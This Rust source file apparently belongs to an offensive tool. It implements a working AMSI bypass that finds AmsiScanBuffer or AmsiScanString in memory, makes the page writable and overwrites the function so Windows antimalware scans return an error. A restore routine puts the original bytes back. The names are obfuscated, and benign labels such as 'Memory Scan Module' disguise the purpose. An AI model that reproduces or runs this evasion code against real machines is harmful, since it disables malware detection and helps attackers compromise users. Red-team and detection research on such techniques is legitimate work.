use crate::log::LogSink;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum AmsiTarget {
    AmsiScanBuffer,
    AmsiScanString,
}

impl AmsiTarget {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "amsiscanbuffer" | "scanbuffer" | "amsi" => Some(Self::AmsiScanBuffer),
            "amsiscanstring" | "scanstring" => Some(Self::AmsiScanString),
            _ => None,
        }
    }

    pub fn name(&self) -> String {
        match self {
            Self::AmsiScanBuffer => crate::obf::s(crate::obf::AMSI_SCAN_BUFFER),
            Self::AmsiScanString => crate::obf::s(crate::obf::AMSI_SCAN_STRING),
        }
    }

    pub fn dll(&self) -> String {
        crate::obf::s(crate::obf::AMSI_DLL)
    }

    pub fn patch_bytes(&self) -> Vec<u8> {
        let p = crate::obf::ba(&crate::obf::AMSI_PATCH);
        p.to_vec()
    }

    pub fn all() -> &'static [Self] {
        &[Self::AmsiScanBuffer, Self::AmsiScanString]
    }
}

pub struct PatchState {
    pub original_bytes: Vec<u8>,
    pub target: String,
    pub address: usize,
}

pub fn dry_run(target: &str, log: &LogSink) {
    let name: String = AmsiTarget::from_str(target).map_or_else(|| target.to_string(), |t| t.name());

    log.info(format!("[DRY RUN] Memory Scan Module — {name}"));
    log.detail(format!("  Target: {name}"));
    log.detail("  Patch: 6 bytes (function returns E_INVALIDARG)".to_string());
    log.info(String::new());
    log.detail("  Steps: load DLL → resolve → save → protect → patch → restore".to_string());
}

pub fn print_info(log: &LogSink) {
    log.info("=== Memory Scan Module ===".to_string());
    log.info(String::new());
    log.detail("Patches scan functions to return immediately.".to_string());
    log.detail("Original bytes are saved for restoration.".to_string());
}

#[cfg(windows)]
pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
    use std::ffi::CString;
    use crate::resolve;

    #[link(name = "kernel32")]
    extern "system" {
        fn GetProcAddress(module: *mut std::ffi::c_void, name: *const u8) -> *mut std::ffi::c_void;
    }

    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    let amsi_target = AmsiTarget::from_str(target)
        .ok_or_else(|| format!("unknown AMSI target: {target}"))?;
    let func_name = amsi_target.name();
    let dll_name = amsi_target.dll();
    let patch = amsi_target.patch_bytes();

    log.step(format!("[1/5] Load target library"));
    let dll_cstr = CString::new(dll_name.as_str())
        .map_err(|e| format!("invalid DLL name: {e}"))?;
    let dll_handle = unsafe { resolve::LoadLibraryA(dll_cstr.as_ptr() as *const u8) };
    if dll_handle.is_null() {
        return Err("library load failed — target DLL may not be available".to_string());
    }

    log.step(format!("[2/5] Resolve function address"));
    let func_cstr = CString::new(func_name.as_str())
        .map_err(|e| format!("invalid function name: {e}"))?;
    let func_addr = unsafe { GetProcAddress(dll_handle, func_cstr.as_ptr() as *const u8) };
    if func_addr.is_null() {
        return Err(format!("function lookup failed: {func_name} not found in {dll_name}"));
    }
    let addr = func_addr as usize;
    log.detail(format!("  Address: 0x{addr:016X}"));

    log.step("[3/5] Saving original bytes".to_string());
    let mut original_bytes = vec![0u8; patch.len()];
    for (i, byte) in original_bytes.iter_mut().enumerate() {
        *byte = unsafe { *((addr + i) as *const u8) };
    }
    let hex: Vec<String> = original_bytes.iter().map(|b| format!("{b:02X}")).collect();
    log.detail(format!("  Original: {}", hex.join(" ")));

    log.step("[4/5] Make memory writable".to_string());
    let mut old_protect: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(
            addr as *const std::ffi::c_void,
            patch.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };
    if ok == 0 {
        return Err("memory protection change failed".to_string());
    }

    log.step("[5/5] Writing patch bytes → restoring protection".to_string());
    for (i, &byte) in patch.iter().enumerate() {
        unsafe {
            *((addr + i) as *mut u8) = byte;
        }
    }

    let mut discard: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(
            addr as *const std::ffi::c_void,
            patch.len(),
            old_protect,
            &mut discard,
        )
    };
    if ok == 0 {
        return Err("memory protection restore failed".to_string());
    }

    let patch_hex: Vec<String> = patch.iter().map(|b| format!("{b:02X}")).collect();
    log.info(format!(
        "  Patched: {func_name} [{}]",
        patch_hex.join(" ")
    ));

    Ok(PatchState {
        original_bytes,
        target: func_name.to_string(),
        address: addr,
    })
}

#[cfg(windows)]
pub fn restore(state: &PatchState, log: &LogSink) -> Result<(), String> {
    use crate::resolve;

    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    let addr = state.address;
    log.step(format!("[1/2] Make memory writable (0x{addr:016X})"));

    let mut old_protect: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(
            addr as *const std::ffi::c_void,
            state.original_bytes.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    };
    if ok == 0 {
        return Err("memory protection change failed".to_string());
    }

    log.step("[2/2] Restoring original bytes".to_string());
    for (i, &byte) in state.original_bytes.iter().enumerate() {
        unsafe {
            *((addr + i) as *mut u8) = byte;
        }
    }

    let mut discard: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtect(
            addr as *const std::ffi::c_void,
            state.original_bytes.len(),
            old_protect,
            &mut discard,
        )
    };
    if ok == 0 {
        return Err("memory protection restore failed".to_string());
    }

    log.info(format!("  ✓ {} restored to original bytes", state.target));
    Ok(())
}

#[cfg(not(windows))]
pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
    let amsi_target = AmsiTarget::from_str(target)
        .ok_or_else(|| format!("unknown AMSI target: {target}"))?;
    let _name = amsi_target.name();
    let _dll = amsi_target.dll();
    log.warning("  AMSI bypass requires Windows.".to_string());
    Err("AMSI bypass is only available on Windows".to_string())
}

#[cfg(not(windows))]
pub fn restore(_state: &PatchState, log: &LogSink) -> Result<(), String> {
    log.warning("  AMSI restore requires Windows.".to_string());
    Err("AMSI restore is only available on Windows".to_string())
}
